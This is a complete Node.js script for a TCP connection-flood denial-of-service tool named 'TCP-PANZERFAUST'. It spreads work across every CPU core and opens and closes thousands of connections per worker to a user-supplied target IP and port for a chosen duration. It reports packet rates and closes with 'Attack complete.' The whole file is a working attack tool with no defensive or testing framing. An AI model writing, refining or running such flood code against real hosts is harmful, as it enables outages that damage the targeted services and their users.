const net = require('net');
const cluster = require('cluster');
const os = require('os');

const target = process.argv[2];
const port = parseInt(process.argv[3]) || 80;
const duration = parseInt(process.argv[4]);

if (!target || isNaN(duration)) {
  console.log('Usage: node tcp-min-pps.js <target_ip> <port> <duration_seconds>');
  process.exit(1);
}

const endTime = Date.now() + duration * 1000;
const cpuCount = os.cpus().length;
const socketsPerWorker = 1000; // Push concurrency high to get max PPS

function formatNumber(n) {
  const units = ['', 'K', 'M', 'B', 'T'];
  let i = 0;
  while (n >= 1000 && i < units.length - 1) {
    n /= 1000;
    i++;
  }
  return `${n.toFixed(2)}${units[i]}`;
}

if (cluster.isMaster) {
  let totalPackets = 0;
  let maxPPS = 0;

  console.clear();
  console.log('TCP-PANZERFAUST [MAX PPS MIN PAYLOAD]');
  console.log('--------------------------------------');
  console.log(`Target:         ${target}:${port}`);
  console.log(`Duration:       ${duration}s`);
  console.log(`Cores:          ${cpuCount}`);
  console.log(`Sockets/Core:   ${socketsPerWorker}`);
  console.log('Launching...\n');

  for (let i = 0; i < cpuCount; i++) cluster.fork();

  for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg.type === 'stats') {
        totalPackets += msg.pps;
        if (msg.pps > maxPPS) maxPPS = msg.pps;
      }
    });
  }

  setInterval(() => {
    console.clear();
    console.log('TCP-PANZERFAUST [MAX PPS MIN PAYLOAD]');
    console.log('--------------------------------------');
    console.log(`Total Packets Sent:  ${formatNumber(totalPackets)}`);
    console.log(`Max PPS:             ${formatNumber(maxPPS)}`);
    console.log(`Target:              ${target}:${port}`);
    console.log(`Payload:             0 bytes (connect+close)`);
    console.log('--------------------------------------');
    maxPPS = 0;
  }, 2000);

  setTimeout(() => {
    console.log('\nAttack complete.');
    for (const id in cluster.workers) cluster.workers[id].kill();
    process.exit(0);
  }, duration * 1000);

} else {
  let pps = 0;

  function spam() {
    function connectOnce() {
      if (Date.now() > endTime) return;

      const socket = net.createConnection({ host: target, port: port }, () => {
        socket.setNoDelay(true);
        pps++;
        socket.destroy(); // Immediately close connection (fires FIN)
      });

      socket.on('error', () => {});
    }

    // Use intervals to flood connection attempts aggressively
    for (let i = 0; i < socketsPerWorker; i++) {
      setInterval(connectOnce, 0); // "0" means ASAP in libuv, max concurrency
    }
  }

  spam();

  setInterval(() => {
    process.send({ type: 'stats', pps });
    pps = 0;
  }, 1000);
}
